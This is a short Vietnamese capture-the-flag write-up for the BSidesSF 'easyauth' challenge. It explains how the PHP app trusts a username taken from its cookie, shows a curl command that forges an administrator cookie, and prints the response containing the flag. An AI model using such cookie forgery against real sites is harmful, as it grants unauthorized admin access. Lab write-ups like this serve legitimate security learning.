## easyauth

> Can you gain admin access to this site?
>
> http://easyauth-afee0e67.ctf.bsidessf.net
>
>    [easyauth.php](./lib/easyauth.php)

#### WriteUp

Đọc qua đoạn code trên thì có thể thấy, đề bài nhắm vào vấn đề `cookie`, đại khái là cookie sẽ có dạng

```
 auth=username=xxx&date=xxx&
 ```

 Nhưng điểm yếu ở đây là thằng dev nó rãnh rỗi, sử dụng biến `$username` khi nhận được từ biến `$_POST['username']` không thích đâu, cứ thích phải thay đổi từ cookie mà ra cơ.

```
$args = array();
foreach($pairs as $pair) {
  if(!strpos($pair, '='))
    continue;

  list($name, $value) = explode('=', $pair, 2);
  $args[$name] = $value;
}
username = $args['username'];
```

Vì vậy, công việc của mình chỉ là thay đổi biến `username` từ cookie hay nói cách khác là tạo 1 cookie giả để lấy được tài khoản `administrator` thôi.

Mình sẽ sử dụng công cụ `curl` để chèn cookie giả vào header.

```
traioi$ curl http://easyauth-afee0e67.ctf.bsidessf.net/ -H "Cookie: auth=username=administrator&date=123&"
```

```
<h1>Welcome back, administrator!</h1>
<p>Congratulations, you're the administrator! Here's your reward:</p>
<p>FLAG:0076ecde2daae415d7e5ccc7db909e7e</p>
<p><a href='/index.php?action=logout'>Log out</a></p>
```

À há, flag kìa rồi, submit và lấy điểm thôi `FLAG:0076ecde2daae415d7e5ccc7db909e7e`
